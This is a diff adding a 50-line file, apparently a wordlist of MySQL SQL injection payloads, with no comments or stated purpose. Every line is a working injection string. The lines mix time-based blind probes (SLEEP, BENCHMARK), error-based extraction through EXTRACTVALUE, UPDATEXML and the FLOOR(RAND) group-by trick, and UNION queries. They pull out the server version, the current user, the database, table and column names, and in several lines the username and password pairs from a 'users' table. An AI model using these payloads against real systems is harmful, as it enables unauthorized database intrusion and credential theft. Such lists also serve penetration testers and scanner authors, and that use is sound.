@@ -1,0 +1,50 @@
+' AND SLEEP(5) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND IF(1=1,SLEEP(5),0) AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' UNION SELECT SLEEP(5),@@version,user(),database()--
+' OR (SELECT SLEEP(5) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)))--
+' AND BENCHMARK(5000000,MD5('test')) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64,SLEEP(5),0) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--
+' UNION SELECT IF(1=1,SLEEP(5),0),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR SLEEP(5) OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
+' AND (SELECT * FROM (SELECT SLEEP(5))a) AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e),1)--
+' UNION SELECT SLEEP(5),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)),NULL--
+' AND BENCHMARK(5000000,SHA1('test')) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' OR (SELECT IF(1=1,SLEEP(5),0)) OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64) THEN SLEEP(5) ELSE 0 END AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e),1)--
+' UNION SELECT BENCHMARK(5000000,MD5('test')),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)),NULL--
+' AND (SELECT 1 FROM (SELECT SLEEP(5) UNION SELECT 1)a) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR SLEEP(5) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) OR 1=1--
+' AND IF(1=1,BENCHMARK(5000000,MD5('test')),0) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' UNION SELECT SLEEP(5),UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1),NULL--
+' AND (SELECT CASE WHEN ((SELECT COUNT(*) FROM users)>0) THEN SLEEP(5) ELSE 0 END) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' OR (SELECT * FROM (SELECT SLEEP(5))a) OR UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)--
+' AND SLEEP(5) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' UNION SELECT IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64,SLEEP(5),0),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))--
+' AND BENCHMARK(5000000,ENCODE('test','key')) AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--
+' OR SLEEP(5) OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT IF(1=1,SLEEP(5),0)) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))--
+' UNION SELECT SLEEP(5),(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y),NULL--
+' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR (SELECT SLEEP(5)) OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND IF((SELECT user())='root@localhost',SLEEP(5),0) AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' UNION SELECT BENCHMARK(5000000,SHA1('test')),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)),NULL--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR SLEEP(5) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))<91,SLEEP(5),0) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
+' UNION SELECT SLEEP(5),UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1),NULL--
+' AND BENCHMARK(5000000,MD5('test')) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))--
+' OR (SELECT IF(1=1,SLEEP(5),0)) OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables)>10) THEN SLEEP(5) ELSE 0 END AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' UNION SELECT IF(1=1,BENCHMARK(5000000,MD5('test')),0),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)),NULL--
+' AND (SELECT * FROM (SELECT SLEEP(5))a) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR SLEEP(5) OR UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--
+' AND IF((SELECT LENGTH(DATABASE()))>0,SLEEP(5),0) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))--
+' UNION SELECT SLEEP(5),(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y),NULL--
+' AND BENCHMARK(5000000,SHA1('test')) AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR (SELECT SLEEP(5)) OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT IF(1=1,SLEEP(5),0)) AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' UNION SELECT SLEEP(5),EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)),NULL--
+' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' OR SLEEP(5) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
